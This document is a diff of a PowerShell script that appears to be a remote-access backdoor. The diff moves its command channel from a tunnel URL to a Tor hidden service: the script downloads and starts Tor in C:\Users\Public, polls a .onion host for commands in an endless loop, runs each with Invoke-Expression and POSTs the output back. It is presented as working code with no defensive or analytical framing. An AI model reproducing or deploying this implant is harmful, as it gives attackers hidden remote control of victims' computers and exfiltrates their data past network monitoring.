@@ -1,21 +1,54 @@
 $log = "C:\Users\Public\log.txt"
-$url = "https://85a4b5f72ca9c6.lhr.life"
+$zip = "C:\Users\Public\link.zip"
+$extract = "C:\Users\Public\extract\"
+$torrcPath = "$extract\Tor\torrc"
+$url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
+$link = "https://www.torproject.org/dist/torbrowser/12.5.6/tor-win64-0.4.8.11.zip"
+
+function download {
+    if (Test-Path $extract) {
+        "TOR already downloaded. Skipping..." | Out-File -Append -FilePath $log
+    } else {
+        Invoke-WebRequest -Uri $link -OutFile $zip
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $extract)
+        Remove-Item $zip
+    }
+}
+
+function writeTorrc {
+    if (!(Test-Path $torrcPath)) {
+        "SOCKSPort 9050" | Out-File -FilePath $torrcPath -Encoding ascii
+    }
+}
+
+function startTor {
+    Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $torrcPath" -WindowStyle Normal
+}
+
+function waitForTor {
+    do {
+        Start-Sleep -Seconds 3
+        $ready = Test-NetConnection -ComputerName 127.0.0.1 -Port 9050
+    } until ($ready.TcpTestSucceeded)
+    "Tor connection established." | Out-File -Append -FilePath $log
+}
 
 function main {
     try {
-        $cmd = (Invoke-WebRequest -Uri "$url/get").Content.Trim()
-        "$((Get-Date).ToString()) - Command received: $cmd" | Out-File -Append -FilePath $log
+        $cmd = & curl.exe --socks5-hostname 127.0.0.1:9050 "$url/get"
+        "$((Get-Date).ToString()) - Command: $cmd" | Out-File -Append -FilePath $log
 
         if ($cmd -and $cmd -ne "noop") {
             try {
                 $output = Invoke-Expression $cmd | Out-String
                 $outText = "SUCCESS: $output"
                 $outText | Out-File -Append -FilePath $log
-                Invoke-WebRequest -Uri "$url/report" -Method POST -Body $outText
+                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -d "$outText" "$url/report"
             } catch {
                 $err = "ERROR: $($_.Exception.Message)"
                 $err | Out-File -Append -FilePath $log
-                Invoke-WebRequest -Uri "$url/report" -Method POST -Body $err
+                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -d "$err" "$url/report"
             }
         }
     } catch {
@@ -23,6 +56,11 @@ function main {
     }
     Start-Sleep -Seconds 5
 }
+
+download
+writeTorrc
+startTor
+waitForTor
 
 while ($true) {
     main
